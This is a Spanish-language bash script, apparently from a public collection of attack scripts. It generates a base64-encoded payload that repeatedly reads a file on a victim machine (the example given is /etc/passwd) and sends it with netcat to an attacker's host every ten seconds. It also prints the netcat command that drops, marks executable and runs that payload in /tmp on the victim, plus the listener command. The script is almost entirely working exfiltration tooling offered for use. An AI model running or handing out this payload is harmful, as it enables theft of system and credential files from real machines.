#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para crear payloads que envíen el cat de un archivo a un orrenador remoto.
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Payloads/CrearPayloadParaCatDeArchivo.sh | bash -s [IPAtacante] [PuertoAtacante] [IPVictima] [PuertoVictima] [ArchivoVictimaALeer]
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Payloads/CrearPayloadParaCatDeArchivo.sh | nano -
# ----------

# Definir constantes de color
  cColorAzul='\033[0;34m'
  cColorAzulClaro='\033[1;34m'
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Definir la cantidad de argumentos esperados
  cCantParamEsperados=5

# Comprobar que se hayan pasado la cantidad de parámetros correctos. Abortar el script si no.
  if [ $# -ne $cCantParamEsperados ]
    then
      echo ""
      echo -e "${cColorRojo}  Mal uso del script. El uso correcto sería: ${cFinColor}"
      echo "    $0 [IPAtacante] [PuertoAtacante] [IPVictima] [PuertoVictima] [ArchivoVictimaALeer]"
      echo ""
      echo "  Ejemplo:"
      echo "    $0 '"$(hostname -I | cut -d' ' -f1)"' '4444' '192.168.1.10' '1234' '/etc/passwd'"
      echo ""
      exit
  fi

# Comprobar si el paquete netcat-openbsd está instalado. Si no lo está, instalarlo.
  if [[ $(dpkg-query -s netcat-openbsd 2>/dev/null | grep installed) == "" ]]; then
    echo ""
    echo -e "${cColorRojo}  El paquete netcat-openbsd no está instalado. Iniciando su instalación...${cFinColor}"
    echo ""
    sudo apt-get -y update
    sudo apt-get -y install netcat-openbsd
    echo ""
  fi

# Definir variables
  vIPAtacante="$1"
  vPuertoAtacante="$2"
  vIPVictima="$3"
  vPuertoVictima="$4"
  vRutaAlArchivo="$5"

# Crear payload en base 64
  vABase64=$(printf "#!/bin/bash\nwhile true; do\n  cat '"$vRutaAlArchivo"' | nc "$vIPAtacante" "$vPuertoAtacante" 2> /dev/null \n  sleep 10\ndone\n")
  echo ""
  echo "Cadena a pasar a base64:"
  echo "$vABase64"
  echo ""
  vParteDelPayloadEnBase64=$(echo -n "$vABase64" | base64 -w 0) # Para que no corte la cadena base64 en dos
  echo ""
  echo "Base64 resultante: $vParteDelPayloadEnBase64"
  echo ""

# Mostrar el payload
  echo ""
  echo "  Ejecuta el siguiente payload en una terminal de la máquina atacante:"
  echo ""
  echo "    echo 'echo "$vParteDelPayloadEnBase64" | base64 -d > /tmp/_nugepin && chmod +x /tmp/_nugepin && /tmp/_nugepin &' | nc "$vIPVictima" "$vPuertoVictima""
  echo ""
  echo "  El comando enviará el payload que creará el script que enviará cada 10 segundos el contenido del archivo."
  echo "  Le dará permisos de ejecución y lo ejecutará."
  echo "  El contenido del archivo llegará cada 10 segundos."
  echo "  Para recibirlo, en otra terminal de la máquina atacante ejecuta:"
  echo ""
  echo "    nc -lvnp 4444"
  echo ""
  echo "  Tendrás que salir con CTRL+C y volver a ejecutar nc para recibir el siguiente payload."
  echo ""
  echo "  Si lo que quieres es recibir todos los payloads en la misma ventana, ejecuta este script:"
  echo ""
  echo "  https://github.com/nipegun/dh-scripts/blob/main/Ataques/Payloads/RecibirPayloads.py"
  echo ""
